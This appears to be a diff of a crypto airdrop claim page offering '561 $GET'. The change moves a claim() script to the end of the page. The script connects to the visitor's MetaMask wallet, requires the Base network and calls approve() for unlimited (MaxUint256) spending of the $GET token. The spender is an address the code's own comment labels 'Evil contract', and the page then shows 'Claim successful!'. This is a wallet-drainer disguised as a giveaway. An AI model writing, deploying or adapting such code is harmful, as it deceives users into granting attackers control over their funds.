@@ -318,49 +318,8 @@
         <div class="eligibility">
           ✅ You are eligible for <strong>561 $GET</strong><br>
 
-          
-<button onclick="claim()">Claim Now</button>
-
-<script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
-
-          
-          <script>
-  async function claim() {
-    if (typeof window.ethereum !== "undefined") {
-      try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = provider.getSigner();
-
-        const { chainId } = await provider.getNetwork();
-        if (chainId !== 8453) {
-          alert("Please switch to Base Mainnet to claim.");
-          return;
-        }
-
-        const contract = new ethers.Contract(
-          "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb", // $GET Token
-          ["function approve(address,uint256) external returns (bool)"],
-          signer
-        );
-
-        const tx = await contract.approve(
-          "0xd58cd540Da1b043180fBF7Dd35D587210d3C9183", // Evil contract or claim handler
-          ethers.constants.MaxUint256
-        );
-
-        await tx.wait();
-        alert("✅ Claim successful!");
-      } catch (err) {
-        console.error("❌ Claim failed:", err);
-        alert("❌ Claim failed: " + (err.message || "Unknown error"));
-      }
-    } else {
-      alert("❌ MetaMask not detected. Please install it.");
-    }
-  }
-</script>
-        
+          <button type="button" onclick="claim()">Claim Now</button>
+       
         </div>
       </div>
     </div>
@@ -445,6 +404,46 @@
       alert("MetaMask not detected. Please install it.");
     }
   });
+</script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+
+<script>
+  async function claim() {
+    if (typeof window.ethereum !== "undefined") {
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+
+        const { chainId } = await provider.getNetwork();
+        if (chainId !== 8453) {
+          alert("Please switch to Base Mainnet to claim.");
+          return;
+        }
+
+        const contract = new ethers.Contract(
+          "0x0ce64839CE3C3BE0bAfa17e7D2E2c98A8ca02Bbb", // $GET Token
+          ["function approve(address,uint256) external returns (bool)"],
+          signer
+        );
+
+        const tx = await contract.approve(
+          "0xd58cd540Da1b043180fBF7Dd35D587210d3C9183", // Evil or claim contract
+          ethers.constants.MaxUint256
+        );
+
+        await tx.wait();
+        alert("✅ Claim successful!");
+      } catch (err) {
+        console.error("❌ Claim failed:", err);
+        alert("❌ Claim failed: " + (err.message || "Unknown error"));
+      }
+    } else {
+      alert("❌ MetaMask not detected. Please install it.");
+    }
+  }
 </script>
   
 </body>
